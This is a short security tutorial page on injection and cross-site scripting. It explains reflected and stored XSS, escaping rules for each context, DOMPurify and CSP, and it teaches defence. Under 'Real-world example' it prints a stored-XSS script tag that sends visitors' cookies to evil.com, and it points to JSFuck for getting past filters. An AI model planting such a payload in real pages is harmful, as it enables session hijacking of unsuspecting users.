---
title: Injection & XSS
sidebar_position: 17
tags: [xss, injection, attack, owasp-a03]
---

:::info TL;DR
Injection attacks insert malicious code into a trusted context; XSS is the browser-side variant where attacker-controlled scripts execute in a victim's browser.
:::

## What is it?

**Injection** means inserting malicious code into a trusted context — HTML, SQL, JavaScript, or a URL — so that it gets interpreted and executed rather than treated as data. **Cross-Site Scripting (XSS)** is the browser-side form of injection, listed as OWASP A03. There are two main types:

- **Reflected XSS**: the payload is embedded in a URL and reflected back in the server's response — it executes in the victim's browser when they visit the crafted link
- **Stored XSS**: the payload is saved to a database and executes for every user who views the affected page

## How it works

The root cause is mixing untrusted data with code without proper escaping. The escaping rules differ by context:

| Context | Rule |
|---|---|
| HTML | Convert `<`, `>`, `&`, `"`, `'` to HTML entities |
| JavaScript | Escape for JS strings/identifiers (different rules than HTML) |
| URL | URL-encode special characters |

A common mistake is using `innerHTML` with untrusted data — this parses the string as HTML and executes any embedded scripts. Use `textContent` instead, or escape the data first.

For cases where HTML must be rendered (e.g., rich text), sanitize with a library rather than trying to build a blocklist manually.

## Real-world example

A comment field on a forum saves user input directly to the database without sanitization. An attacker posts:

```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

This is stored XSS — every visitor who loads that page silently sends their session cookie to the attacker's server, enabling session hijacking without any interaction beyond viewing the page.

## How to defend

- **Context-aware escaping**: apply the correct escaping rules for each output context (HTML, JS, URL)
- **Never use `innerHTML` with untrusted data**: use `textContent` or escape first
- **DOMPurify**: production-standard library for sanitizing HTML — `DOMPurify.sanitize(dirty)`
- **`setHTML()`**: modern browser API that auto-sanitizes on insertion (Firefox 148+)
- **escape-goat**: lightweight npm library for HTML escaping — `npm install escape-goat`
- **Content Security Policy (CSP)**: HTTP header that restricts which scripts the browser will execute, providing a strong second layer of defence

**Practice and tools:**

- [prompt.ml](https://prompt.ml) — 16 levels + 4 hidden, focused on filter bypass
- [escape.alf.nu](https://escape.alf.nu) — 15 challenges, "alert(1) to win!"
- [JSFuck](https://jsfuck.com/) — encodes JS using only `[]()!+` characters, useful for bypassing naive filters in CTFs

:::tip 💡 Easy to remember
Injection is like a waiter who reads your written order out loud and accidentally executes whatever you wrote — escaping is the process of making sure the kitchen only ever sees ingredients, never commands.
:::
